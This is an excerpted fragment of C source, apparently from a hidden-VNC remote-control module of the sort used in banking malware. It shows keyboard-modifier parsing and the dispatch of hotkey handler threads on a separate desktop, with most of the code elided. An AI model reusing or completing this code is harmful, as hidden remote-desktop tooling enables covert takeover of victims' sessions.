...
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef _INJLIB
...
UINT IntGetModifiers(PBYTE pKeyState)
{
    UINT fModifiers=0;
    ...
    if (pKeyState[VK_MENU] & 0x80)
        fModifiers|=MOD_ALT;

    if ((pKeyState[VK_LWIN] & 0x80) || (pKeyState[VK_RWIN] & 0x80))
        fModifiers|=MOD_WIN;
...
void WINAPI HotKeyThread(HK_THREAD *lpThreadInfo)
{
    __try
    {
        HVNC_HANDLE *lpHandle=VNCGetHandleInformation(lpThreadInfo->hVNC);
        SetThreadDesktop(lpHandle->lpServer->hDesktop);
        lpThreadInfo->lpHotKey->lpProc(lpThreadInfo->hVNC,lpThreadInfo->lpHotKey->dwId);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}
    MemFree(lpThreadInfo);
    return;
}
...
void ExecuteKeySym(rfbClientPtr cl,HWND hWnd,DWORD dwKeySym,rfbBool bDown)
{
    ...
    if ((lpServer->HotKeysInfo.lpHotKey) && (uMsg == WM_KEYDOWN))
    {
        EnterCriticalSection(&lpServer->HotKeysInfo.csHotKeys);
        {
            HOTKEYINFO *lpHotKey=lpServer->HotKeysInfo.lpHotKey;
            HVNC hVNC=lpServer->HotKeysInfo.hVNC;
            UINT fsModifiers=IntGetModifiers(lpServer->lpGlobalVNCData->KbdState);
            while (lpHotKey)
            {
                if ((fsModifiers == lpHotKey->dwFsModifiers) && (dwVK == lpHotKey->dwVK))
                {
                    HK_THREAD *lpThread=(HK_THREAD*)MemAlloc(sizeof(HK_THREAD));
                    lpThread->hVNC=hVNC;
                    lpThread->lpHotKey=lpHotKey;
                    SysCloseHandle(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)HotKeyThread,lpThread,0,NULL));
                    break;
                }
